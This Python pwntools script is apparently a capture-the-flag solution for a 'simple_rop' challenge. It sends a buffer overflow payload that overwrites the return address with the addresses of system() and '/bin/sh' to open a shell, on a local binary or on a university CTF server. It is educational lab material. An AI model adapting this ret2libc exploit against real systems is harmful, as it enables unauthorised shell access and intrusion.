#!/usr/bin/python3

from pwn import *

DEBUG = True

if DEBUG:
    r = process('./simple_rop')

else:
    r = remote('ctf-fsi.fe.up.pt', 7008)

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = 0x10 + 4
sh_addr = 0x6f7ac442  # The address of "/bin/sh"
content[X:X + 4] = (sh_addr).to_bytes(4, byteorder='little')

Y = X + 4
system_addr = 0x2a8bd420  # The address of system()
content[Y:Y + 4] = (system_addr).to_bytes(4, byteorder='little')

r.recvuntil(b"flag!")
r.sendline(content)
r.interactive()
